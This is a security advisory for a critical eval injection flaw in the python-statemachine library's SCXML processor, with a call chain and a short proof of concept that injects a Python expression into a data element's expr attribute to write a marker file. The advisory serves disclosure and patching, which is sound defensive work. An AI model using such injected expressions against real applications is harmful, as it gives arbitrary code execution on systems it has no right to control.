# [C] python-statemachine SCXML <data expr> Eval Injection

## Summary
Severity: Critical
Advisory: GHSA-v4jc-pm6r-3vj8
CVE: CVE-2026-47103
CWE: CWE-95
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-v4jc-pm6r-3vj8
Type: github-advisory

## Affected
- PyPI: `python-statemachine` — affected >=3.0.0 <3.2.0

## Details
### Summary

python-statemachine 3.1.2 evaluates `<data expr="...">` attributes in SCXML documents using Python's `eval()`. Any application that passes attacker-controlled SCXML content to `SCXMLProcessor` is vulnerable to arbitrary code execution in the context of the hosting process.

### Details

`SCXMLProcessor.parse_scxml_file()` processes SCXML documents and evaluates `<data>` element `expr` attributes via the following call chain:

```
SCXMLProcessor.parse_scxml_file()
SCXMLProcessor.process_definition()
create_datamodel_action_callable()
_create_dataitem_callable()
_eval()
eval()
```

`_eval()` calls Python's built-in `eval()` directly on the expression string without sandboxing or restriction.

### PoC

```
1. Install:
   pip install python-statemachine==3.1.2

2. Create an SCXML file containing:
   <data id="x" expr="__import__('pathlib').Path('marker.txt').write_text('pwned')"/>

3. Run:
   SCXMLProcessor.parse_scxml_file(DATA_EXPR_CHART)
   SCXMLProcessor.start()

4. During start(), <data expr> reaches _eval(), which calls eval().

5. Result:
   data_marker_before_start: False
   data_marker_after_start: True
   success: True
```

### Impact

This is an eval injection vulnerability (CWE-95). Remote or local code execution depending on whether the consuming application accepts SCXML content from remote users, uploaded files, configuration, plugins, or other untrusted sources.

## References
- https://github.com/fgmacedo/python-statemachine/security/advisories/GHSA-v4jc-pm6r-3vj8
- https://nvd.nist.gov/vuln/detail/CVE-2026-47103
- https://github.com/fgmacedo/python-statemachine
- https://github.com/fgmacedo/python-statemachine/releases/tag/v3.2.0
- https://www.vulncheck.com/advisories/python-statemachine-rce-via-scxml-eval-injection
